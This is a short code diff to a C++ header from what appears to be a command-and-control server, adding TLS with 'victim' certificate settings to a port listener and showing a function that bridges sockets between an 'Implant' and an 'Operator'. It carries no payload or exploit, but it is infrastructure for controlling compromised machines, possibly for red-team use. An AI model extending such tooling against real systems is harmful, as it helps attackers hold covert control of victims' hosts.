@@ -1,6 +1,8 @@
 #pragma once
 
 #include "Logger.hpp"
+#include "Config.hpp"
+
 #include <Remote.hpp>
 #include <Server.hpp>
 #include <cstdint>
@@ -41,9 +43,14 @@ public:
     bool start_listener(uint16_t port) {
         std::lock_guard lock(mtx);
         if (listeners.contains(port)) return false;
+        auto& config = Config::instance("server.db");
 
-        listeners[port] = std::jthread([this, port](std::stop_token stoken) {
-            cpppwn::Server server(port);
+        listeners[port] = std::jthread([this, port, &config](std::stop_token stoken) {
+            cpppwn::TlsConfig tls_conf{
+                config.get<std::string>("victim_cert"),
+                config.get<std::string>("victim_key")
+            };
+            cpppwn::Server server(port, tls_conf);
 
             while (not stoken.stop_requested()) {
                 auto conn = server.accept();
@@ -91,7 +98,6 @@ public:
     //
     //--------------------------------
     void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& a_ptr, std::unique_ptr<cpppwn::Remote>&& b_ptr) {
-        //
         std::thread([vic = std::move(a_ptr), op = std::move(b_ptr)]() -> void {
             logger::success("Bridging established between Implant and Operator.");
 
